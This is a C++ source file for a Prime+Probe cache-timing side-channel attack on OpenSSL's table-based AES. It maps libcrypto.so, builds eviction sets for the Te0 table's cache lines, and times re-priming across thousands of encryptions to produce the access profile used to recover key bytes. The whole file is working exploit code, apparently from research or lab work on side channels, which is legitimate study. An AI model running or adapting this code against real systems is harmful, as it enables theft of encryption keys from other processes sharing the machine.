#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "../cacheutils.h"
#include "eviction.h"
#include <map>
#include <vector>

// this number varies on different systems
#define PRIME_THRESHOLD (240)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (5000)

extern "C" Elem* evset_find(void* addr);

unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  //0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c,
  //0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};

size_t sum;
size_t scount;

std::map<char*, std::map<size_t, size_t> > timings;

char* base;
char* probe;
char* end;

void traverse(Elem* arr) {
  Elem *ptr = arr;

  for(int i=0; i<13; i+=2) {
    maccess((void *) ptr->next->next->next);
    maccess((void *) ptr->next->next);
    //maccess((void *) arr);
    maccess((void *) ptr->next);
    ptr = ptr->next->next;
  }
}

void prime(Elem* arr)
{
    traverse(arr);
    //traverse(arr);
}

int main()
{
  int fd = open("/home/rzhang/openssl/libcrypto.so", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if ((map_size & 0xFFF) != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];

  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);
  AES_encrypt(plaintext, ciphertext, &key_struct);

  // adjust me (decreasing order)
  int te0 = 0x15df80;
  int te1 = 0x15db80;
  int te2 = 0x15d780;
  int te3 = 0x15d380;


  for (probe = base + te0; probe < base + te0 + 16*64; probe += 64) {
    maccess(probe);
  }

  probe = base+te0;
  Elem* s = evset_find(probe);
  Elem* eviction_sets[16];

  for (probe = base + te0; probe < base + te0 + 16*64; probe += 64) {
    int index = (probe - base - te0) / 64;
    eviction_sets[index] = evset_find(probe);
  }

  uint64_t min_time = rdtsc();
  srand(min_time);
  sum = 0;
  for (size_t byte = 0; byte < 256; byte += 16)
  {
    plaintext[0] = byte;
    //plaintext[1] = byte;
    //plaintext[2] = byte;
    //plaintext[3] = byte;

    AES_encrypt(plaintext, ciphertext, &key_struct);

    //adjust address range to exclude unwanted lines/tables
    for (probe = base + te0; probe < base + te0 + 16*64; probe += 64) 
    {
      int index = (probe - base - te0) / 64;
      prime(eviction_sets[index]);
      mfence();

      size_t count = 0;
      for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
      {
        for (size_t j = 1; j < 16; ++j)
          plaintext[j] = rand() % 256;
          
        AES_encrypt(plaintext, ciphertext, &key_struct);
        //maccess(probe);
        mfence();
        sched_yield();

        size_t time = rdtsc();
        prime(eviction_sets[index]);
	      size_t delta = rdtsc() - time;
	      mfence();

        if (delta >= PRIME_THRESHOLD)
          ++count;
      }
      timings[probe][byte] = count;
    }
  }
 
  for (auto ait : timings)
  {
    printf("%p", (void*) (ait.first - base));
    for (auto kit : ait.second)
    {
      int s = kit.second - NUMBER_OF_ENCRYPTIONS / 100 * 90;
      printf(",%6d", s < 0 ? 0 : s);
    }
    printf("\n");
  }

  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}

